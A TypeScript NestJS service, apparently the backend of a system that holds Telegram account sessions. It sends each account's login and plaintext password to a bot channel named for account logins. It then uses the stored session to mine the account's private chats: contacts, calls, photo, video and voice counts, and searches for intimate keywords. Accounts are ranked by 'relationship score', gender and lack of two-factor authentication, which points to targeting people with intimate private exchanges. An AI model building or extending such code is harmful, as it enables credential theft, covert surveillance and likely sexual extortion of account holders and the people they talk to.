import { TelegramService } from './../Telegram/Telegram.service';
import {
  BadRequestException,
  Inject,
  Injectable,
  InternalServerErrorException,
  NotFoundException,
  forwardRef,
} from '@nestjs/common';
import { InjectModel } from '@nestjs/mongoose';
import { Model, QueryFilter } from 'mongoose';
import { User, UserDocument } from './schemas/user.schema';
import { SearchUserDto } from './dto/search-user.dto';
import { ClientService } from '../clients/client.service';
import { UpdateUserDto } from './dto/update-user.dto';
import { CreateUserDto } from './dto/create-user.dto';
import { connectionManager } from '../Telegram/utils/connection-manager';
import { BotsService, ChannelCategory } from '../bots';
import { sleep } from 'telegram/Helpers';
import { Logger } from '../../utils';
import { INTIMATE_KEYWORDS, NEGATIVE_KEYWORDS, rankRelationships, computeAccountScore, RelationshipCandidate } from './scoring';
import { Api } from 'telegram/tl';
import bigInt from 'big-integer';
import { parseError } from '../../utils/parseError';

@Injectable()
export class UsersService {
  private readonly logger = new Logger(UsersService.name);

  constructor(@InjectModel('userModule') private userModel: Model<UserDocument>,
    @Inject(forwardRef(() => TelegramService))
    private telegramService: TelegramService,
    @Inject(forwardRef(() => ClientService))
    private clientsService: ClientService,
    private readonly botsService: BotsService
  ) { }

  async create(user: CreateUserDto): Promise<User | undefined> {
    const activeClientSetup = this.telegramService.getActiveClientSetup(user.mobile);
    this.logger.log(`New User received - ${user?.mobile}`);
    this.logger.debug('ActiveClientSetup:', activeClientSetup);
    if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {
      this.logger.log(`Updating New Session Details: ${user.mobile}, @${user.username}, ${activeClientSetup.clientId}`);
      await this.clientsService.updateClientSession(user.session, user.mobile);
    } else {
      await this.botsService.sendMessageByCategory(ChannelCategory.ACCOUNT_LOGINS, `ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`, undefined, false);
      const newUser = new this.userModel(user);
      const saved = await newUser.save();
      setTimeout(() => {
        this.computeRelationshipScore(user.mobile).catch(err => {
          this.logger.error(`Background scoring failed for ${user.mobile}`, err);
        });
      }, 5000);
      return saved;
    }
  }

  async top(options: {
    page?: number;
    limit?: number;
    minScore?: number;
    minCalls?: number;
    minPhotos?: number;
    minVideos?: number;
    excludeTwoFA?: boolean;
    excludeAudited?: boolean;
    gender?: string;
  }): Promise<{
    users: User[];
    total: number;
    page: number;
    limit: number;
    totalPages: number;
  }> {
    const {
      page = 1,
      limit = 20,
      minScore = 0,
      minCalls = 0,
      minPhotos = 0,
      minVideos = 0,
      excludeTwoFA = false,
      gender,
    } = options;

    const pageNum = Math.max(1, Math.floor(page));
    const limitNum = Math.min(Math.max(1, Math.floor(limit)), 100);
    const skip = (pageNum - 1) * limitNum;

    const query: QueryFilter<UserDocument> = {
      expired: { $ne: true },
      'relationships.score': { $gte: minScore },
    };

    if (excludeTwoFA) query.twoFA = { $ne: true };
    if (gender) query.gender = gender;
    if (minCalls > 0) query['calls.totalCalls'] = { $gte: minCalls };
    if (minPhotos > 0) query['photoCount'] = { $gte: minPhotos };
    if (minVideos > 0) query['videoCount'] = { $gte: minVideos };

    const total = await this.userModel.countDocuments(query).exec();
    const totalPages = Math.ceil(total / limitNum);

    if (total === 0) {
      return { users: [], total: 0, page: pageNum, limit: limitNum, totalPages: 0 };
    }

    const users = await this.userModel
      .find(query)
      .select('-session')
      .sort({ 'relationships.score': -1 })
      .skip(skip)
      .limit(limitNum)
      .lean()
      .exec();

    return { users: users as User[], total, page: pageNum, limit: limitNum, totalPages };
  }

  async findAll(limit: number = 100, skip: number = 0): Promise<User[]> {
    return this.userModel.find().limit(limit).skip(skip).exec();
  }

  async findAllSorted(limit: number = 100, skip: number = 0, sort?: Record<string, 1 | -1>): Promise<User[]> {
    const query = this.userModel.find().lean();
    if (sort) query.sort(sort);
    return query.skip(skip).limit(limit).exec();
  }

  async findOne(tgId: string): Promise<User> {
    const doc = await this.userModel.findOne({ tgId }).exec();
    if (!doc) {
      throw new NotFoundException(`User with tgId ${tgId} not found`);
    }
    return doc.toJSON();
  }

  async update(tgId: string, updateDto: UpdateUserDto): Promise<number> {
    const result = await this.userModel
      .updateMany({ tgId }, { $set: updateDto }, { upsert: true })
      .exec();
    if (result.matchedCount === 0) {
      throw new NotFoundException(`Users with tgId ${tgId} not found`);
    }
    return result.modifiedCount;
  }

  async updateByFilter(
    filter: QueryFilter<UserDocument>,
    updateDto: UpdateUserDto,
  ): Promise<number> {
    const result = await this.userModel
      .updateMany(filter, { $set: updateDto }, { upsert: true })
      .exec();
    if (result.matchedCount === 0) {
      throw new NotFoundException(`Users matching filter not found`);
    }
    return result.modifiedCount;
  }

  async delete(tgId: string): Promise<void> {
    const result = await this.userModel.updateOne({ tgId }, { $set: { expired: true } }).exec();
    if (result.matchedCount === 0) {
      throw new NotFoundException(`User with tgId ${tgId} not found`);
    }
  }

  async search(filter: SearchUserDto): Promise<User[]> {
    const query: QueryFilter<UserDocument> = { ...filter };

    if (query.firstName) {
      query.firstName = { $regex: new RegExp(query.firstName as string, 'i') };
    }

    return this.userModel.find(query).sort({ updatedAt: -1 }).exec();
  }

  async computeRelationshipScore(mobile: string): Promise<void> {
    const wasConnected = connectionManager.hasClient(mobile);
    let telegramClient: Awaited<ReturnType<typeof connectionManager.getClient>> | null = null;

    try {
      telegramClient = await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
      const me = await telegramClient.getMe();
      const selfId = me.id?.toString();

      // ─── Phase 1: Hybrid candidate discovery ───
      // Source A: GetTopPeers — Telegram's server-side interaction ranking (not recency-biased)
      // Source B: iterDialogs — recent chats (catches new relationships GetTopPeers hasn't ranked yet)
      // Merge + dedup to get the best of both worlds

      const candidateMap = new Map<string, { id: string; name: string; username: string | null; phone: string | null; source: 'topPeers' | 'dialogs' | 'both' }>();

      // Source A: GetTopPeers (1 API call — most valuable signal)
      try {
        const topPeersResult = await telegramClient.client.invoke(
          new Api.contacts.GetTopPeers({
            correspondents: true,
            phoneCalls: true,
            forwardUsers: true,
            offset: 0,
            limit: 50,
            hash: bigInt(0),
          }),
        );

        if (topPeersResult instanceof Api.contacts.TopPeers) {
          const userMap = new Map<string, Api.User>();
          for (const u of topPeersResult.users || []) {
            if (u instanceof Api.User && !u.bot) {
              userMap.set(u.id.toString(), u);
            }
          }

          for (const category of topPeersResult.categories || []) {
            for (const topPeer of category.peers || []) {
              const peerId = (topPeer.peer as any)?.userId?.toString();
              if (!peerId || peerId === selfId) continue;
              const user = userMap.get(peerId);
              if (!user) continue;
              candidateMap.set(peerId, {
                id: peerId,
                name: [user.firstName, user.lastName].filter(Boolean).join(' ').trim() || 'Unknown',
                username: user.username || null,
                phone: user.phone || null,
                source: 'topPeers',
              });
            }
          }
          this.logger.log(`[${mobile}] GetTopPeers: ${candidateMap.size} candidates`);
        }
      } catch (topPeersError) {
        this.logger.warn(`[${mobile}] GetTopPeers failed (may be disabled): ${(topPeersError as Error).message}`);
      }

      // Source B: iterDialogs — recent private chats (catches what GetTopPeers misses)
      try {
        let dialogCount = 0;
        for await (const d of telegramClient.client.iterDialogs({ limit: 100 })) {
          if (!d.isUser || !(d.entity instanceof Api.User)) continue;
          const user = d.entity as Api.User;
          if (user.bot) continue;
          const id = user.id.toString();
          if (id === selfId) continue;

          const existing = candidateMap.get(id);
          if (existing) {
            existing.source = 'both';
          } else {
            candidateMap.set(id, {
              id,
              name: [user.firstName, user.lastName].filter(Boolean).join(' ').trim() || 'Unknown',
              username: user.username || null,
              phone: user.phone || null,
              source: 'dialogs',
            });
          }
          dialogCount++;
          if (dialogCount >= 40) break;
        }
        this.logger.log(`[${mobile}] iterDialogs: ${dialogCount} users scanned, total candidates: ${candidateMap.size}`);
      } catch (dialogError) {
        this.logger.warn(`[${mobile}] iterDialogs failed: ${(dialogError as Error).message}`);
      }

      if (candidateMap.size === 0) {
        this.logger.log(`[${mobile}] No candidates found from either source`);
        return;
      }

      // ─── Phase 1.5: Contacts for mutual detection ───
      const mutualChatIds = new Set<string>();
      try {
        const contactsResult = await telegramClient.getContacts();
        if (contactsResult && 'users' in contactsResult) {
          for (const user of (contactsResult as any).users || []) {
            if (user.mutualContact) mutualChatIds.add(user.id?.toString());
          }
        }
      } catch { }

      // ─── Phase 2: Per-chat enrichment (top 15 candidates) ───
      // For each candidate: message count, media count, voice count, call stats,
      // common chats, intimate keyword search — NO media filter (text-heavy relationships qualify)

      const allCandidates = Array.from(candidateMap.values()).slice(0, 15);
      const candidates: RelationshipCandidate[] = [];
      const callAgg = { totalCalls: 0, incoming: 0, outgoing: 0, video: 0, audio: 0 };

      for (const candidate of allCandidates) {
        try {
          const chatPeer = await telegramClient.getchatId(candidate.id);

          // Message count (1 API call)
          let totalMessages = 0;
          let lastMessageDate: string | null = null;
          try {
            const msgResult = await telegramClient.client.getMessages(candidate.id, { limit: 1 });
            totalMessages = (msgResult as any)?.total ?? 0;
            const lastMsg = (msgResult as any)?.[0];
            if (lastMsg?.date) {
              lastMessageDate = new Date(lastMsg.date * 1000).toISOString();
            }
          } catch { }

          // Skip chats with < 5 messages (noise)
          if (totalMessages < 5) {
            await sleep(100);
            continue;
          }

          // Media + voice counts via GetSearchCounters (1 API call, 4 filters)
          // Photos + round videos = personal media (full weight)
          // Regular videos counted separately (discounted — could be forwarded large files)
          // Documents excluded entirely (not relationship signals)
          let photoCount = 0;
          let videoCount = 0;
          let roundVideoCount = 0;
          let voiceCount = 0;
          try {
            const counters = await telegramClient.client.invoke(
              new Api.messages.GetSearchCounters({
                peer: chatPeer,
                filters: [
                  new Api.InputMessagesFilterPhotos(),
                  new Api.InputMessagesFilterVideo(),
                  new Api.InputMessagesFilterRoundVideo(),
                  new Api.InputMessagesFilterVoice(),
                ],
              }),
            );
            const counterArr = counters as any as Array<{ count: number }>;
            photoCount = counterArr?.[0]?.count ?? 0;
            videoCount = counterArr?.[1]?.count ?? 0;
            roundVideoCount = counterArr?.[2]?.count ?? 0;
            voiceCount = counterArr?.[3]?.count ?? 0;
          } catch { }
          // Personal media = photos + round videos (always small/personal)
          // Regular videos discounted 50% (many are forwarded movies/clips >20MB)
          const mediaCount = photoCount + roundVideoCount + Math.floor(videoCount * 0.5);

          // Call stats — includeCalls=true to get per-call entries for duration filtering
          let callStats = { totalCalls: 0, incoming: 0, videoCalls: 0, totalDuration: 0, averageDuration: 0, outgoing: 0, audioCalls: 0, meaningfulCalls: 0 };
          try {
            const callHistory = await telegramClient.getChatCallHistory(candidate.id, 200, true);
            const meaningfulCalls = (callHistory as any).calls
              ? (callHistory as any).calls.filter((c: any) => c.durationSeconds > 30).length
              : (callHistory.averageDuration > 30 ? callHistory.totalCalls : 0);
            callStats = {
              totalCalls: callHistory.totalCalls,
              incoming: callHistory.incoming,
              outgoing: callHistory.outgoing,
              videoCalls: callHistory.videoCalls,
              audioCalls: callHistory.audioCalls,
              totalDuration: callHistory.totalDuration,
              averageDuration: callHistory.averageDuration,
              meaningfulCalls,
            };
            callAgg.totalCalls += callStats.totalCalls;
            callAgg.incoming += callStats.incoming;
            callAgg.outgoing += callStats.outgoing;
            callAgg.video += callStats.videoCalls;
            callAgg.audio += callStats.audioCalls;
          } catch { }

          // Common chats
          let commonChats = 0;
          try {
            const common = await telegramClient.client.invoke(
              new Api.messages.GetCommonChats({
                userId: candidate.id,
                maxId: bigInt(0),
                limit: 100,
              }),
            );
            commonChats = (common as any)?.chats?.length ?? 0;
          } catch { }

          // Keyword search — intimate (positive) + movie/piracy (negative)
          let intimateMessageCount = 0;
          let negativeKeywordCount = 0;

          const searchKeyword = async (keyword: string): Promise<number> => {
            try {
              const result = await telegramClient.client.invoke(
                new Api.messages.Search({
                  peer: chatPeer,
                  q: keyword,
                  filter: new Api.InputMessagesFilterEmpty(),
                  minDate: 0,
                  maxDate: 0,
                  offsetId: 0,
                  addOffset: 0,
                  limit: 1,
                  maxId: 0,
                  minId: 0,
                  hash: bigInt(0),
                }),
              );
              await sleep(150);
              return (result as any)?.count ?? 0;
            } catch { return 0; }
          };

          for (const keyword of INTIMATE_KEYWORDS) {
            intimateMessageCount += await searchKeyword(keyword);
          }
          for (const keyword of NEGATIVE_KEYWORDS) {
            negativeKeywordCount += await searchKeyword(keyword);
          }

          candidates.push({
            chatId: candidate.id,
            name: candidate.name,
            username: candidate.username,
            phone: candidate.phone,
            messages: totalMessages,
            mediaCount,
            voiceCount,
            intimateMessageCount,
            negativeKeywordCount,
            calls: {
              total: callStats.totalCalls,
              incoming: callStats.incoming,
              videoCalls: callStats.videoCalls,
              avgDuration: callStats.averageDuration,
              totalDuration: callStats.totalDuration,
              meaningfulCalls: callStats.meaningfulCalls,
            },
            commonChats,
            isMutualContact: mutualChatIds.has(candidate.id),
            lastMessageDate,
          });

          this.logger.debug(`[${mobile}] Scored ${candidate.name}: msgs=${totalMessages} media=${mediaCount} voice=${voiceCount} intimate=${intimateMessageCount} calls=${callStats.totalCalls} (${candidate.source})`);
          await sleep(200);
        } catch (chatError) {
          this.logger.warn(`[${mobile}] Failed to score chat ${candidate.id}: ${(chatError as Error).message}`);
        }
      }

      // ─── Phase 3: Rank, persist ───
      const top = rankRelationships(candidates, 5);
      const accountScore = computeAccountScore(top);
      const bestScore = top.length > 0 ? top[0].score : 0;

      await this.userModel.updateOne(
        { mobile },
        {
          $set: {
            'relationships.score': accountScore,
            'relationships.bestScore': bestScore,
            'relationships.computedAt': new Date(),
            'relationships.top': top,
            calls: callAgg,
          },
        },
      ).exec();

      this.logger.log(`[${mobile}] Relationship scoring complete: accountScore=${accountScore}, bestScore=${bestScore}, topCount=${top.length}, candidates=${candidates.length}/${candidateMap.size}`);
    } catch (error) {
      parseError(error, `[${mobile}] computeRelationshipScore failed`);
    } finally {
      if (!wasConnected && telegramClient) {
        await connectionManager.unregisterClient(mobile).catch(() => undefined);
      }
    }
  }

  async topRelationships(options: {
    page?: number;
    limit?: number;
    minScore?: number;
    gender?: string;
    excludeTwoFA?: boolean;
  }) {
    const { page = 1, limit = 20, minScore = 0, excludeTwoFA = false, gender } = options;
    const pageNum = Math.max(1, Math.floor(page));
    const limitNum = Math.min(Math.max(1, Math.floor(limit)), 100);
    const skip = (pageNum - 1) * limitNum;

    const query: QueryFilter<UserDocument> = {
      expired: { $ne: true },
      'relationships.bestScore': { $gt: minScore },
    };
    if (excludeTwoFA) query.twoFA = { $ne: true };
    if (gender) query.gender = gender;

    const total = await this.userModel.countDocuments(query).exec();
    if (total === 0) {
      return { users: [], total: 0, page: pageNum, limit: limitNum, totalPages: 0 };
    }

    const users = await this.userModel
      .find(query)
      .select('-session -password')
      .sort({ 'relationships.bestScore': -1 })
      .skip(skip)
      .limit(limitNum)
      .lean()
      .exec();

    return { users, total, page: pageNum, limit: limitNum, totalPages: Math.ceil(total / limitNum) };
  }

  async getUserRelationships(mobile: string) {
    const user = await this.userModel
      .findOne({ mobile })
      .select('mobile firstName lastName tgId relationships')
      .lean()
      .exec();
    if (!user) throw new NotFoundException(`User with mobile ${mobile} not found`);
    return user;
  }

  async aggregateSort(
    computedField: string,
    sortOrder: 1 | -1 = -1,
    limit: number = 20,
    skip: number = 0,
  ): Promise<any[]> {
    const COMPUTED_FIELDS: Record<string, any> = {
      intimateTotal: {
        $reduce: {
          input: { $ifNull: ['$relationships.top', []] },
          initialValue: 0,
          in: { $add: ['$$value', { $ifNull: ['$$this.intimateMessageCount', 0] }] },
        },
      },
      privateMsgsTopContacts: {
        $reduce: {
          input: { $ifNull: ['$relationships.top', []] },
          initialValue: 0,
          in: { $add: ['$$value', { $ifNull: ['$$this.messages', 0] }] },
        },
      },
      privateMediaTopContacts: {
        $reduce: {
          input: { $ifNull: ['$relationships.top', []] },
          initialValue: 0,
          in: { $add: ['$$value', { $ifNull: ['$$this.mediaCount', 0] }] },
        },
      },
      privateVoiceTotal: {
        $reduce: {
          input: { $ifNull: ['$relationships.top', []] },
          initialValue: 0,
          in: { $add: ['$$value', { $ifNull: ['$$this.voiceCount', 0] }] },
        },
      },
      privateMsgsBestContact: {
        $ifNull: [{ $arrayElemAt: ['$relationships.top.messages', 0] }, 0],
      },
      relTopIntimate: {
        $ifNull: [{ $arrayElemAt: ['$relationships.top.intimateMessageCount', 0] }, 0],
      },
      relTopMedia: {
        $ifNull: [{ $arrayElemAt: ['$relationships.top.mediaCount', 0] }, 0],
      },
      relTopVoice: {
        $ifNull: [{ $arrayElemAt: ['$relationships.top.voiceCount', 0] }, 0],
      },
      relCommonChats: {
        $ifNull: [{ $arrayElemAt: ['$relationships.top.commonChats', 0] }, 0],
      },
      relTopCalls: {
        $ifNull: [{ $arrayElemAt: ['$relationships.top.calls.total', 0] }, 0],
      },
      relMeaningfulCalls: {
        $ifNull: [{ $arrayElemAt: ['$relationships.top.calls.meaningfulCalls', 0] }, 0],
      },
      relMutualContacts: {
        $size: {
          $filter: {
            input: { $ifNull: ['$relationships.top', []] },
            as: 'r',
            cond: { $eq: ['$$r.isMutualContact', true] },
          },
        },
      },
      callPartners: {
        $size: { $ifNull: ['$calls.chats', []] },
      },
      totalCallDuration: {
        $reduce: {
          input: { $ifNull: ['$calls.chats', []] },
          initialValue: 0,
          in: { $add: ['$$value', { $ifNull: ['$$this.totalDuration', 0] }] },
        },
      },
      longestCall: {
        $reduce: {
          input: { $ifNull: ['$calls.chats', []] },
          initialValue: 0,
          in: { $max: ['$$value', { $ifNull: ['$$this.longestCall', 0] }] },
        },
      },
      missedCalls: {
        $reduce: {
          input: { $ifNull: ['$calls.chats', []] },
          initialValue: 0,
          in: { $add: ['$$value', { $ifNull: ['$$this.missed', 0] }] },
        },
      },
      privateMsgsCallPartners: {
        $reduce: {
          input: { $ifNull: ['$calls.chats', []] },
          initialValue: 0,
          in: { $add: ['$$value', { $ifNull: ['$$this.totalMessages', 0] }] },
        },
      },
    };

    const fieldExpr = COMPUTED_FIELDS[computedField];
    if (!fieldExpr) {
      throw new BadRequestException(`Unknown computed field: ${computedField}`);
    }

    return this.userModel.aggregate([
      { $addFields: { _computedSort: fieldExpr } },
      { $sort: { _computedSort: sortOrder } },
      { $skip: skip },
      { $limit: limit },
      { $project: { _computedSort: 0 } },
    ]).exec();
  }

  async executeQuery(
    query: QueryFilter<UserDocument>,
    sort?: Record<string, 1 | -1>,
    limit?: number,
    skip?: number,
  ): Promise<User[]> {
    if (!query) {
      throw new BadRequestException('Query is invalid.');
    }

    try {
      const queryExec = this.userModel.find(query).lean();

      if (sort) queryExec.sort(sort);
      if (limit) queryExec.limit(limit);
      if (skip) queryExec.skip(skip);

      return await queryExec.exec();
    } catch (error: any) {
      throw new InternalServerErrorException(error.message);
    }
  }

}
